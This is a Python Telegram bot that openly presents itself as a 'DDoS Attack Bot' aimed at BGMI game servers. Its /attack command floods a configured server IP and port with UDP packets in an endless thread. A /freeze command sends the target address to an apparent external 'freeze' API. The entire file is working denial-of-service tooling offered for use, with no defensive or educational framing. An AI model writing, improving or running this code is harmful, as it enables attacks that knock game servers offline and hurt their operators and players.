import socket
import threading
import requests
import yaml
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Load configuration from YAML file
with open('config.yml', 'r') as file:
    config = yaml.safe_load(file)

TELEGRAM_BOT_TOKEN = config['telegram_bot']['token']
BGMI_SERVER_IP = config['bgmi_server']['ip']
BGMI_SERVER_PORT = config['bgmi_server']['port']

# Telegram Bot Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Welcome to the DDoS Attack Bot! Use /attack to launch an attack on BGMI server.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Launching UDP DDoS attack on BGMI server...")
    threading.Thread(target=launch_udp_attack).start()

def launch_udp_attack():
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Send UDP packets to BGMI server
    while True:
        sock.sendto(b'UDP DDoS Attack', (BGMI_SERVER_IP, BGMI_SERVER_PORT))
        print(f"Sent UDP packet to BGMI server at {BGMI_SERVER_IP}:{BGMI_SERVER_PORT}")

async def freeze_game_server(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Freezing the BGMI game server...")
    # Simulate freezing the server via API
    response = requests.get(f"https://api.bgmi-freeze.com/freeze?server={BGMI_SERVER_IP}")
    if response.status_code == 200:
        await update.message.reply_text("Server frozen successfully!")
    else:
        await update.message.reply_text("Failed to freeze the server.")

# Main function to run Telegram bot
def main():
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("freeze", freeze_game_server))

    application.run_polling()

if __name__ == '__main__':
    main()